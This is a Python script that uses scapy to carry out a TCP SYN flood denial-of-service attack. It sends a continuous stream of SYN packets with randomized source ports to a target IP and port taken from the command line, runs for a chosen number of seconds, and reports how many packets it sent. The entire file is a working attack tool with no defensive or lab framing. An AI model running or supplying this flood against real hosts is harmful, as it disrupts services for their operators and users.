import random
import sys
import time
from scapy.all import IP, TCP, send

MIN_ARGUMENTS = 4
SRC_PORT_MIN = 1024
SRC_PORT_MAX = 65535
SEND_INTERVAL = 0.0
SYN_FLAG = "S"

def run_flood(target_ip, target_port, duration_seconds):
    end_time = time.time() + duration_seconds
    sent = 0
    while time.time() < end_time:
        source_port = random.randint(SRC_PORT_MIN, SRC_PORT_MAX)
        packet = IP(dst=target_ip) / TCP(sport=source_port, dport=target_port, flags=SYN_FLAG)
        send(packet, verbose=0)
        sent = sent + 1
    print(f"SYN flood finished: {sent} SYN packets to {target_ip}:{target_port}")

def main():
    if len(sys.argv) < MIN_ARGUMENTS:
        print("Usage: sudo venv/bin/python synflood.py TARGET_IP TARGET_PORT SECONDS")
        return
    target_ip = sys.argv[1]
    target_port = int(sys.argv[2])
    duration_seconds = int(sys.argv[3])
    print(f"SYN flooding {target_ip}:{target_port} for {duration_seconds}s...")
    run_flood(target_ip, target_port, duration_seconds)

if __name__ == "__main__":
    main()